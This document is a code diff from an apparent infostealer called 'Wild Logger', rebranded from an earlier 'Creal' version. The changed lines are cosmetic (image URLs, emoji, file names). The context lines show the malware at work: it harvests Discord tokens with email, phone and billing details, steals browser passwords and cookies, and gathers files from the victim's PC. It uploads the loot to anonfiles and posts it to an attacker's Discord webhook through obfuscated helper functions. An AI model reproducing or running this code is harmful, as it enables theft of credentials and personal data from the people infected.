@@ -361,7 +361,7 @@ def upl05dT4k31(AuthT0kenDisc0rd, path):
     us3rn4m1, hashtag, em31l, idd, pfp, flags, n1tr0, ph0n3 = G3tT0k4n1nf9(AuthT0kenDisc0rd)
 
     if pfp == None: 
-        pfp = "https://raw.githubusercontent.com/brickinghouses/Wild-Logger/main/proxy-image.jpg?token=GHSAT0AAAAAACGMKFC4HDO7O4EIUVLBLMBIZG5DPJA"
+        pfp = "https://raw.githubusercontent.com/brickinghouses/Wild-Logger/main/imgs/cute.jpg"
     else:
         pfp = f"https://cdn.discordapp.com/avatars/{idd}/{pfp}"
 
@@ -390,7 +390,7 @@ def upl05dT4k31(AuthT0kenDisc0rd, path):
                     "inline": True
                 },
                 {
-                    "name": "<a:1689_Ringing_Phone:755219417075417088> Phone Number:",
+                    "name": ":mobile_phone: Phone Number:",
                     "value": f"```{ph0n3}```",
                     "inline": True
                 },
@@ -405,7 +405,7 @@ def upl05dT4k31(AuthT0kenDisc0rd, path):
                     "inline": True
                 },
                 {
-                    "name": "<a:4394_cc_creditcard_cartao_f4bihy:755218296801984553> Billing:",
+                    "name": ":credit_card: Billing:",
                     "value": f"{b1ll1ng}",
                     "inline": True
                 },
@@ -421,14 +421,14 @@ def upl05dT4k31(AuthT0kenDisc0rd, path):
                 },
             "footer": {
                 "text": "Wild Logger",
-                "icon_url": "https://raw.githubusercontent.com/brickinghouses/Wild-Logger/main/proxy-image.jpg?token=GHSAT0AAAAAACGMKFC4HDO7O4EIUVLBLMBIZG5DPJA"
+                "icon_url": "https://raw.githubusercontent.com/brickinghouses/Wild-Logger/main/imgs/cute.jpg"
                 },
             "thumbnail": {
                 "url": f"{pfp}"
                 }
-            }
+            }  
         ],
-        "avatar_url": "hhttps://raw.githubusercontent.com/brickinghouses/Wild-Logger/main/proxy-image.jpg?token=GHSAT0AAAAAACGMKFC4HDO7O4EIUVLBLMBIZG5DPJA",
+        "avatar_url": "hhttps://raw.githubusercontent.com/brickinghouses/Wild-Logger/main/imgs/cute.jpg",
         "username": "Wild Logger",
         "attachments": []
         }
@@ -448,7 +448,7 @@ def upload(name, link):
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
     }
 
-    if name == "crcook":
+    if name == "WildC0ks":
         rb = ' | '.join(da for da in cookiWords)
         if len(rb) > 1000: 
             rrrrr = R4f0rm3t(str(cookiWords))
@@ -458,22 +458,22 @@ def upload(name, link):
             "embeds": [
                 {
                     "title": "Wild Cookies Logger",
-                    "description": f"<:apollondelirmis:1012370180845883493>: **Accounts:**\n\n{rb}\n\n**Data:**\n<:cookies_tlm:816619063618568234> • **{CookiCount}** Yummy Cookies Found:3\n<a:CH_IconArrowRight:715585320178941993> • [CrealCookies.txt]({link})",
+                    "description": f"<:apollondelirmis:1012370180845883493>: **Accounts:**\n\n{rb}\n\n**Data:**\n<:cookies_tlm:816619063618568234> • **{CookiCount}** Yummy Cookies Found:3\n<a:CH_IconArrowRight:715585320178941993> • [WildCookies .txt]({link})",
                     "color": 0xFFC0CB,
                     "footer": {
                         "text": "Wild Logger",
-                        "icon_url": "https://raw.githubusercontent.com/brickinghouses/Wild-Logger/main/proxy-image.jpg?token=GHSAT0AAAAAACGMKFC4HDO7O4EIUVLBLMBIZG5DPJA"
+                        "icon_url": "https://raw.githubusercontent.com/brickinghouses/Wild-Logger/main/imgs/cute.jpg"
                     }
                 }
             ],
             "username": "Wild Logger",
-            "avatar_url": "https://raw.githubusercontent.com/brickinghouses/Wild-Logger/main/proxy-image.jpg?token=GHSAT0AAAAAACGMKFC4HDO7O4EIUVLBLMBIZG5DPJA",
+            "avatar_url": "https://raw.githubusercontent.com/brickinghouses/Wild-Logger/main/imgs/cute.jpg",
             "attachments": []
             }
         L04durl1b(webh00k, data=dumps(data).encode(), headers=headers)
         return
 
-    if name == "crpassw":
+    if name == "WildPws":
         ra = ' | '.join(da for da in paswWords)
         if len(ra) > 1000: 
             rrr = R4f0rm3t(str(paswWords))
@@ -484,16 +484,16 @@ def upload(name, link):
             "embeds": [
                 {
                     "title": "Wild Passwords Stealer",
-                    "description": f"<:apollondelirmis:1012370180845883493>: **Accounts**:\n{ra}\n\n**Data:**\n<a:hira_kasaanahtari:886942856969875476> • **{P4sswCount}** Passwords Found\n<a:CH_IconArrowRight:715585320178941993> • [CrealPassword.txt]({link})",
+                    "description": f"<:apollondelirmis:1012370180845883493>: **Accounts**:\n{ra}\n\n**Data:**\n<a:hira_kasaanahtari:886942856969875476> • **{P4sswCount}** Passwords Found\n<a:CH_IconArrowRight:715585320178941993> • [WildPassword.txt]({link})",
                     "color": 0xFFC0CB,
                     "footer": {
                         "text": "Wild Logger",
-                        "icon_url": "https://raw.githubusercontent.com/brickinghouses/Wild-Logger/main/proxy-image.jpg?token=GHSAT0AAAAAACGMKFC4HDO7O4EIUVLBLMBIZG5DPJA"
+                        "icon_url": "https://raw.githubusercontent.com/brickinghouses/Wild-Logger/main/imgs/cute.jpg"
                     }
                 }
             ],
             "username": "Wild",
-            "avatar_url": "https://raw.githubusercontent.com/brickinghouses/Wild-Logger/main/proxy-image.jpg?token=GHSAT0AAAAAACGMKFC4HDO7O4EIUVLBLMBIZG5DPJA",
+            "avatar_url": "https://raw.githubusercontent.com/brickinghouses/Wild-Logger/main/imgs/cute.jpg",
             "attachments": []
             }
         L04durl1b(webh00k, data=dumps(data).encode(), headers=headers)
@@ -507,7 +507,7 @@ def upload(name, link):
                 "color": 0xFFC0CB,
                 "fields": [
                     {
-                    "name": "files found on users pc",
+                    "name": "files found on users PC",
                     "value": link
                     }
                 ],
@@ -516,12 +516,12 @@ def upload(name, link):
                 },
                 "footer": {
                     "text": "Wild Logger",
-                    "icon_url": "https://raw.githubusercontent.com/brickinghouses/Wild-Logger/main/proxy-image.jpg?token=GHSAT0AAAAAACGMKFC4HDO7O4EIUVLBLMBIZG5DPJA"
+                    "icon_url": "https://raw.githubusercontent.com/brickinghouses/Wild-Logger/main/imgs/cute.jpg"
                 }
                 }
             ],
             "username": "Wild Logger",
-            "avatar_url": "https://raw.githubusercontent.com/brickinghouses/Wild-Logger/main/proxy-image.jpg?token=GHSAT0AAAAAACGMKFC4HDO7O4EIUVLBLMBIZG5DPJA",
+            "avatar_url": "https://raw.githubusercontent.com/brickinghouses/Wild-Logger/main/imgs/cute.jpg",
             "attachments": []
             }
         L04durl1b(webh00k, data=dumps(data).encode(), headers=headers)
@@ -707,12 +707,12 @@ def GatherZips(paths1, paths2, paths3):
             "color": 0xFFC0CB,
             "footer": {
                 "text": "Wild Logger",
-                "icon_url": "https://raw.githubusercontent.com/brickinghouses/Wild-Logger/main/proxy-image.jpg?token=GHSAT0AAAAAACGMKFC4HDO7O4EIUVLBLMBIZG5DPJA"
+                "icon_url": "https://raw.githubusercontent.com/brickinghouses/Wild-Logger/main/imgs/cute.jpg"
             }
             }
         ],
         "username": "Wild Logger",
-        "avatar_url": "https://raw.githubusercontent.com/brickinghouses/Wild-Logger/main/proxy-image.jpg?token=GHSAT0AAAAAACGMKFC4HDO7O4EIUVLBLMBIZG5DPJA",
+        "avatar_url": "https://raw.githubusercontent.com/brickinghouses/Wild-Logger/main/imgs/cute.jpg",
         "attachments": []
     }
     L04durl1b(webh00k, data=dumps(data).encode(), headers=headers)
@@ -884,7 +884,7 @@ def GatherAll():
     global upths
     upths = []
 
-    for file in ["crpassw.txt", "crcook.txt"]: 
+    for file in ["WildPws.txt", "WildC0ks.txt"]: 
         
         upload(file.replace(".txt", ""), uploadToAnonfiles(os.getenv("TEMP") + "\\" + file))
 
